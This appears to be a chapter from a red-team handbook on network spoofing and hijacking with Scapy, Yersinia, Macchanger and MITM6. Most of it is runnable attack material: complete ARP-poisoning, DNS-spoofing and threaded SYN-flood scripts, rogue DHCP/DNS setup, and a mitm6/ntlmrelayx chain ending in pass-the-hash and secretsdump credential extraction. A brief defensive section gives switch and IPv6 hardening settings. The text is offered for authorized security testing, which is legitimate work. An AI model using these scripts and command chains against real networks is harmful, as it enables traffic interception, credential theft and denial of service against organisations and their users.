# Chapter 16: Network Spoofing and Hijacking

Network spoofing and hijacking attacks involve manipulating network protocols to impersonate legitimate network entities or redirect traffic. This chapter explores specialized tools that enable red teamers to craft custom packets, attack network protocols at multiple layers, and redirect traffic through malicious infrastructure.

## Introduction to Network Spoofing and Hijacking

Network protocols are designed with functionality rather than security as their primary concern. Many fundamental protocols lack proper authentication mechanisms, creating opportunities for attackers to inject themselves into network communications. In red team operations, network spoofing and hijacking serve several important purposes:

- **Traffic interception**: Redirecting traffic to flow through attacker-controlled systems
- **Infrastructure compromise**: Attacking core network services like DHCP and DNS
- **Network intelligence gathering**: Mapping internal networks and data flows
- **Lateral movement**: Gaining access to additional network segments
- **Credential capture**: Obtaining authentication material from network traffic

This chapter explores four powerful tools that enable different aspects of network spoofing and hijacking, from low-level packet manipulation to protocol-specific attacks.

## Scapy: Packet Manipulation

Scapy is a powerful interactive packet manipulation program and library written in Python. It allows you to forge or decode packets of a wide number of protocols, send them on the wire, capture them, and match requests and replies. With Scapy, you can build complex packets from scratch and craft custom network tools.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install python3-scapy

# Using pip
pip3 install scapy

# To install with additional dependencies for graphical tools
pip3 install scapy[complete]
```

### Basic Usage

Scapy can be used both as an interactive tool and as a Python library.

#### Interactive Mode

```bash
# Start the interactive mode
sudo scapy

# Create a simple ICMP packet
>>> packet = IP(dst="192.168.1.1")/ICMP()

# Display packet structure
>>> packet.show()

# Send the packet and receive a response
>>> response = sr1(packet)

# Display the response
>>> response.show()
```

#### Library Mode

```python
#!/usr/bin/env python3
from scapy.all import *

# Create a simple TCP packet
packet = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")

# Send packet and capture response
response = sr1(packet, timeout=1, verbose=0)

# Check for a response
if response:
    if response.haslayer(TCP) and response[TCP].flags == 0x12:
        print("Port 80 is open")
    else:
        print("Port 80 is closed or filtered")
else:
    print("No response received")
```

### Custom Packet Creation

Scapy's strength lies in its ability to create and manipulate packets at a granular level:

#### 1. Basic Layer Construction

```python
# Layer 2 (Ethernet)
ether = Ether(dst="ff:ff:ff:ff:ff:ff", src="00:11:22:33:44:55", type=0x0800)

# Layer 3 (IP)
ip = IP(src="192.168.1.100", dst="192.168.1.1", ttl=64)

# Layer 4 (TCP)
tcp = TCP(sport=1024, dport=80, flags="S", seq=12345)

# Layer 7 (HTTP)
http = Raw(load="GET / HTTP/1.0\r\n\r\n")

# Combine layers
packet = ether/ip/tcp/http
```

#### 2. Protocol-Specific Customization

```python
# ARP packet
arp = ARP(pdst="192.168.1.1/24", hwsrc="00:11:22:33:44:55")

# DNS query packet
dns = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com"))

# DHCP discover packet
dhcp_discover = (Ether(dst="ff:ff:ff:ff:ff:ff")/
                IP(src="0.0.0.0", dst="255.255.255.255")/
                UDP(sport=68, dport=67)/
                BOOTP(chaddr=RandMAC(), xid=RandInt())/
                DHCP(options=[("message-type", "discover"), "end"]))
```

#### 3. Packet Fuzzing and Generation

```python
# Generate a series of packets with varying TTLs
packets = [IP(dst="192.168.1.1", ttl=ttl)/ICMP() for ttl in range(1, 30)]

# Send all packets
send(packets)

# Use fuzzing operators
fuzz_packets = IP(dst="192.168.1.1", proto=fuzz(IP).proto)/Raw(load="X"*100)
```

### Example: Advanced Network Spoofing

This example demonstrates how to use Scapy to conduct sophisticated network spoofing attacks:

#### 1. ARP Cache Poisoning Script

```python
#!/usr/bin/env python3
from scapy.all import *
import sys
import time

def arp_poison(target_ip, gateway_ip, interface="eth0"):
    """
    ARP poison the target to impersonate the gateway
    """
    # Get the MAC addresses
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    if not target_mac:
        print(f"[-] Could not get target MAC for {target_ip}")
        return
    if not gateway_mac:
        print(f"[-] Could not get gateway MAC for {gateway_ip}")
        return
    
    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")
    
    # Craft the spoofed ARP packets
    # Tell target that we are the gateway
    target_packet = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    # Tell gateway that we are the target
    gateway_packet = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    
    print(f"[*] Beginning ARP poison attack...")
    try:
        while True:
            # Send the spoofed ARP packets
            send(target_packet, verbose=0)
            send(gateway_packet, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopping ARP poison attack...")
        # Restore the network by sending correct ARP packets
        restore_target(target_ip, gateway_ip, target_mac, gateway_mac)

def restore_target(target_ip, gateway_ip, target_mac, gateway_mac):
    """
    Restore normal ARP operations
    """
    print("[*] Restoring target...")
    # Tell target the correct gateway MAC
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    # Tell gateway the correct target MAC
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./arp_spoof.py TARGET_IP GATEWAY_IP")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    arp_poison(target_ip, gateway_ip)
```

#### 2. DNS Spoofing with ARP Poisoning

```python
#!/usr/bin/env python3
from scapy.all import *
import threading
import os
import sys
import time

# Domains to spoof
domains_to_spoof = {
    b"www.example.com.": "192.168.1.100",
    b"example.com.": "192.168.1.100"
}

def dns_spoof(pkt):
    """
    Check for DNS queries for domains we want to spoof
    """
    if (DNS in pkt and pkt[DNS].qr == 0):  # DNS query
        domain = pkt[DNS].qd.qname
        if domain in domains_to_spoof:
            print(f"[*] Spoofing DNS response for {domain.decode()}")
            
            # Create spoofed response
            spoofed_ip = domains_to_spoof[domain]
            # Create the response packet
            resp = (IP(dst=pkt[IP].src, src=pkt[IP].dst)/
                   UDP(dport=pkt[UDP].sport, sport=53)/
                   DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                       an=DNSRR(rrname=domain, ttl=10, rdata=spoofed_ip)))
            
            # Send the spoofed packet
            send(resp, verbose=0)
            print(f"[+] Sent spoofed response for {domain.decode()} to {pkt[IP].src}")

def arp_poison(target_ip, gateway_ip):
    """
    ARP poison the target and gateway
    """
    # Similar to the previous example...
    # Implementation omitted for brevity

def packet_sniffer(filter_exp):
    """
    Sniff packets and process DNS queries
    """
    print(f"[*] Starting packet sniffer with filter: {filter_exp}")
    sniff(filter=filter_exp, prn=dns_spoof)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: ./dns_spoof.py TARGET_IP GATEWAY_IP")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Start ARP poisoning in a separate thread
    arp_thread = threading.Thread(target=arp_poison, args=(target_ip, gateway_ip))
    arp_thread.daemon = True
    arp_thread.start()
    
    # Start packet sniffer
    try:
        filter_exp = f"udp port 53 and src {target_ip}"
        packet_sniffer(filter_exp)
    except KeyboardInterrupt:
        print("[*] Stopping DNS spoofing...")
        # Disable IP forwarding
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
```

#### 3. SYN Flood Attack Tool

```python
#!/usr/bin/env python3
from scapy.all import *
import sys
import random
import threading
import time

def syn_flood(target_ip, target_port, number_of_packets=1000):
    """
    Send SYN packets to target
    """
    print(f"[*] Starting SYN flood against {target_ip}:{target_port}")
    total_sent = 0
    
    for _ in range(number_of_packets):
        # Generate random source IP and port
        source_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        source_port = random.randint(1024, 65535)
        
        # Create the SYN packet
        ip_layer = IP(src=source_ip, dst=target_ip)
        tcp_layer = TCP(sport=source_port, dport=target_port, flags="S", seq=random.randint(0, 2**32-1))
        
        # Send the packet
        send(ip_layer/tcp_layer, verbose=0)
        total_sent += 1
        
        # Print progress
        if total_sent % 100 == 0:
            print(f"[+] Sent {total_sent} packets to {target_ip}:{target_port}")
            
    print(f"[*] SYN flood completed. Sent {total_sent} packets.")

def threaded_syn_flood(target_ip, target_port, threads=10, packets_per_thread=1000):
    """
    Launch multiple threads for more efficient SYN flooding
    """
    print(f"[*] Starting threaded SYN flood with {threads} threads")
    
    # Create and start threads
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=syn_flood, args=(target_ip, target_port, packets_per_thread))
        thread_list.append(t)
        t.start()
    
    # Wait for all threads to complete
    for t in thread_list:
        t.join()
    
    print(f"[*] Threaded SYN flood completed. Sent approximately {threads * packets_per_thread} packets.")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: ./syn_flood.py TARGET_IP TARGET_PORT [THREADS] [PACKETS_PER_THREAD]")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    threads = 10
    packets_per_thread = 1000
    
    if len(sys.argv) >= 4:
        threads = int(sys.argv[3])
    if len(sys.argv) >= 5:
        packets_per_thread = int(sys.argv[4])
    
    threaded_syn_flood(target_ip, target_port, threads, packets_per_thread)
```

Scapy's flexibility makes it an essential tool for red teamers who need to craft custom packets or build specialized tools for network manipulation. Its Python integration allows for easy extension and automation, while its comprehensive protocol support enables attacks at all network layers.

## Yersinia: Layer 2 Attack Framework

Yersinia is a powerful framework designed to exploit vulnerabilities in network protocols operating at Layer 2 (Data Link Layer). It specifically targets protocols like Spanning Tree Protocol (STP), Cisco Discovery Protocol (CDP), Dynamic Host Configuration Protocol (DHCP), Hot Standby Router Protocol (HSRP), and others that form the fundamental infrastructure of modern networks.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install yersinia

# From source
git clone https://github.com/tomac/yersinia.git
cd yersinia
./configure
make
sudo make install
```

### Basic Usage

Yersinia offers both a text-based and a graphical interface:

```bash
# Launch text mode
sudo yersinia -h  # Show help
sudo yersinia -I  # Interactive mode
sudo yersinia -G  # GTK graphical interface

# List available attack modes
sudo yersinia -l
```

### Protocol Attacks

Yersinia can attack various Layer 2 protocols:

#### 1. DHCP Attacks

```bash
# DHCP starvation from command line
sudo yersinia dhcp -attack 1

# Release specific DHCP address
sudo yersinia dhcp -attack 2 -arg1 <IP_address>

# DHCP rogue server
sudo yersinia dhcp -attack 3 -arg1 <IP_range_start> -arg2 <IP_range_end>
```

#### 2. STP (Spanning Tree Protocol) Attacks

```bash
# Claim to be root bridge
sudo yersinia stp -attack 1

# STP configuration flood
sudo yersinia stp -attack 2
```

#### 3. CDP (Cisco Discovery Protocol) Attacks

```bash
# CDP flooding
sudo yersinia cdp -attack 1
```

#### 4. VTP (VLAN Trunking Protocol) Attacks

```bash
# VTP flooding
sudo yersinia vtp -attack 1

# Create VTP domain
sudo yersinia vtp -attack 2
```

#### 5. DTP (Dynamic Trunking Protocol) Attacks

```bash
# Negotiate trunk
sudo yersinia dtp -attack 1
```

### Example: DHCP Starvation and Spoofing

This example demonstrates a complete DHCP attack scenario using Yersinia:

1. **Reconnaissance to identify the DHCP server**:

```bash
# Capture DHCP traffic
sudo tcpdump -i eth0 -n port 67 or port 68

# From another terminal, request a new lease
sudo dhclient -r eth0
sudo dhclient eth0
```

2. **Launch a DHCP starvation attack**:

```bash
# Start Yersinia in interactive mode
sudo yersinia -I

# Select DHCP protocol
dhcp

# Launch a DHCP starvation attack
attack 1
```

The DHCP starvation attack works by:
- Creating multiple fake MAC addresses
- Sending DHCP DISCOVER messages from each fake MAC
- Consuming all available IP addresses in the DHCP pool
- Preventing legitimate clients from obtaining IP addresses

3. **Deploy a rogue DHCP server**:

```bash
# Exit the starvation attack (press q)
# Launch a rogue DHCP server attack
attack 3

# Configure the attack parameters
# - IP range start: 192.168.1.100
# - IP range end: 192.168.1.200
# - Default gateway: 192.168.1.254 (attacker's IP)
# - DNS server: 192.168.1.254 (attacker's IP)
```

4. **Set up the attacker's machine to handle DNS and routing**:

```bash
# In a separate terminal
# Configure the attacker's machine as a gateway
sudo ip addr add 192.168.1.254/24 dev eth0

# Enable IP forwarding
sudo echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up NAT for internet access
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE

# Deploy a DNS server (e.g., dnsmasq) for DNS spoofing
sudo apt install dnsmasq
echo "address=/example.com/192.168.1.254" | sudo tee -a /etc/dnsmasq.conf
sudo systemctl restart dnsmasq
```

This attack is effective because:
- It first depletes the legitimate DHCP server's IP pool
- When clients can't get an IP from the legitimate server, they accept offers from the rogue server
- The rogue server provides malicious network configuration (gateway, DNS)
- All client traffic flows through the attacker's machine
- The DNS server directs victims to attacker-controlled websites

Yersinia's specialization in Layer 2 protocols makes it particularly valuable for testing network infrastructure security. These protocols often lack security controls and operate with high trust levels, making them attractive targets for attackers.

## Macchanger: MAC Address Manipulation

Macchanger is a utility for viewing and manipulating the MAC address of network interfaces. MAC address spoofing is useful for bypassing MAC filtering, avoiding tracking, and impersonating legitimate devices on a network.

### Installation

```bash
# On Debian/Ubuntu-based systems
sudo apt update
sudo apt install macchanger

# From source
git clone https://github.com/alobbs/macchanger.git
cd macchanger
./configure
make
sudo make install
```

### Basic Usage

```bash
# Show current MAC address and available options
macchanger --help

# Show current MAC address
macchanger --show eth0

# Set a specific MAC address
sudo ifconfig eth0 down
sudo macchanger --mac=00:11:22:33:44:55 eth0
sudo ifconfig eth0 up

# Set a random MAC address
sudo ifconfig eth0 down
sudo macchanger --random eth0
sudo ifconfig eth0 up

# Set a MAC address from the same vendor
sudo ifconfig eth0 down
sudo macchanger --another eth0
sudo ifconfig eth0 up
```

### Advanced Options

```bash
# Set a MAC address from a specific vendor
sudo macchanger --list
sudo macchanger --mac=00:11:22:00:00:00 eth0  # First 3 bytes define the vendor

# Set a random vendor MAC
sudo macchanger --random-vendor eth0

# Set a MAC address from another device class
sudo macchanger --list-classes
sudo macchanger --class=1 eth0  # Set a MAC from the ethernet card class
```

### Example: Evading MAC Filtering

This example demonstrates how to use Macchanger to bypass MAC address filtering on a network:

1. **Identify authorized MAC addresses on the network**:

```bash
# Set the interface to monitor mode
sudo airmon-ng start wlan0

# Capture management frames to identify valid clients
sudo airodump-ng wlan0mon -c 1 --bssid 00:11:22:33:44:55

# Observe the STATION list to identify connected clients
# Example: 66:77:88:99:AA:BB is connected to the target AP
```

2. **Disable your wireless interface and change MAC address**:

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Disable the interface
sudo ifconfig wlan0 down

# Change to the identified MAC
sudo macchanger --mac=66:77:88:99:AA:BB wlan0

# Verify the change
sudo macchanger --show wlan0

# Enable the interface
sudo ifconfig wlan0 up
```

3. **Connect to the MAC-filtered network**:

```bash
# Connect to the network
sudo nmcli device wifi connect "NetworkName" password "password"
```

4. **After the operation, restore your original MAC address**:

```bash
# Disable the interface
sudo ifconfig wlan0 down

# Restore the permanent MAC address
sudo macchanger --permanent wlan0

# Enable the interface
sudo ifconfig wlan0 up
```

This technique is effective against MAC filtering because:
- MAC filtering relies solely on the MAC address for authentication
- The MAC address is transmitted in cleartext in wireless frames
- Changing a MAC address is a simple software operation
- Many networks rely on MAC filtering as their primary security measure

While MAC filtering can deter casual users, it provides minimal security against determined attackers. Macchanger makes it trivial to bypass this control, demonstrating why MAC filtering should never be the sole security measure for sensitive networks.

## MITM6: IPv6 MITM Tool

MITM6 is a tool that exploits the default IPv6 configuration of modern operating systems to conduct man-in-the-middle attacks. It takes advantage of the fact that Windows systems prefer IPv6 over IPv4 for DNS resolution, even in IPv4-only networks.

### Installation

```bash
# Using pip
pip3 install mitm6

# From source
git clone https://github.com/fox-it/mitm6.git
cd mitm6
pip3 install -e .
```

### Basic Usage

```bash
# Basic usage
sudo mitm6 -i eth0

# Target a specific domain
sudo mitm6 -d example.local -i eth0

# Verbose mode
sudo mitm6 -v -i eth0
```

### Example: DNS Takeover via IPv6

This example demonstrates a complete attack chain using MITM6 to take over DNS resolution and capture credentials:

1. **Start MITM6 to become the IPv6 router and DNS server**:

```bash
# Target the corporate domain
sudo mitm6 -d corporation.local -i eth0
```

MITM6 works by:
- Responding to DHCPv6 requests with malicious IPv6 configuration
- Setting itself as the DNS server for IPv6
- Providing a fake IPv6 address for itself as the default gateway
- Responding to DNS queries for the targeted domain

2. **Combine with ntlmrelayx to capture credentials and relay authentication**:

```bash
# In a separate terminal
# Set up ntlmrelayx to capture NTLM credentials
sudo ntlmrelayx.py -6 -t ldaps://dc01.corporation.local -wh fakewpad.corporation.local -l loot
```

The ntlmrelayx component:
- Creates a fake WPAD server (Web Proxy Auto-Discovery)
- Captures NTLM authentication attempts
- Relays authentication to specified targets
- Can create new domain users or dump LDAP information

3. **Monitor the attack progress**:

```bash
# MITM6 terminal will show:
# - DHCPv6 activity
# - DNS queries being intercepted

# ntlmrelayx terminal will show:
# - NTLM authentication attempts
# - Successful relays
# - Captured information
```

4. **Leverage captured credentials for further access**:

```bash
# Review captured credentials
cat loot/ntlm-hashes.txt

# Use captured credentials for other attacks
sudo crackmapexec smb 192.168.1.0/24 -u administrator -H <NTLM_HASH>

# If domain admin credentials are captured, dump domain data
sudo secretsdump.py -ntds /path/to/ntds.dit -system /path/to/SYSTEM -hashes <NTLM_HASH> LOCAL
```

This attack is particularly effective because:
- Most environments don't monitor or secure IPv6 traffic
- Windows prefers IPv6 by default, even in IPv4-only networks
- The attack requires no user interaction
- It can quickly escalate to domain administrator access

To maximize the attack's effectiveness:
- Target specific domains rather than all DNS traffic
- Run the attack during business hours when users are active
- Combine with other attacks like SMB relaying for maximum impact
- Be selective about relay targets to avoid account lockouts

MITM6 demonstrates the risk of overlooking IPv6 security in predominantly IPv4 environments. Many organizations focus on securing IPv4 traffic while neglecting IPv6, creating a significant blind spot that attackers can exploit.

## Defending Against Network Spoofing and Hijacking

Understanding defensive measures helps red teamers create more realistic tests and provide better remediation advice:

### 1. DHCP Snooping and ARP Inspection

Modern switches can detect and prevent ARP spoofing and rogue DHCP servers:

```bash
# Cisco switch DHCP snooping configuration
switch(config)# ip dhcp snooping
switch(config)# ip dhcp snooping vlan 1-4094
switch(config)# interface GigabitEthernet0/1
switch(config-if)# ip dhcp snooping trust
switch(config)# ip dhcp snooping information option

# Dynamic ARP Inspection
switch(config)# ip arp inspection vlan 1-4094
switch(config)# interface GigabitEthernet0/1
switch(config-if)# ip arp inspection trust
```

### 2. IPv6 Security Controls

```bash
# On Cisco routers/switches
switch(config)# ipv6 nd raguard
switch(config)# ipv6 snooping
switch(config)# ipv6 dhcp guard

# On Linux servers
sudo ip6tables -A INPUT -p icmpv6 --icmpv6-type router-advertisement -j DROP
```

### 3. DNS Security

```bash
# DNSSEC configuration on BIND
options {
    dnssec-enable yes;
    dnssec-validation yes;
    dnssec-lookaside auto;
};

# DNS over TLS/HTTPS on clients
```

## Conclusion

Network spoofing and hijacking attacks exploit fundamental design flaws in network protocols to redirect traffic, impersonate legitimate services, and intercept sensitive data. The tools covered in this chapter—Scapy, Yersinia, Macchanger, and MITM6—represent different approaches to manipulating network traffic at various layers of the OSI model.

These attacks are particularly valuable for red team operations because they:
- Demonstrate realistic attack scenarios with significant impact
- Bypass perimeter defenses by targeting internal network protocols
- Often go undetected by conventional security monitoring
- Can provide persistent access and visibility into network traffic

Remember that as a professional red teamer, your objective is to help organizations identify and address their security weaknesses. Always operate within the scope of your engagement and with proper authorization.

In the next chapter, we'll explore password attacks, focusing on both offline cracking and online brute force techniques.
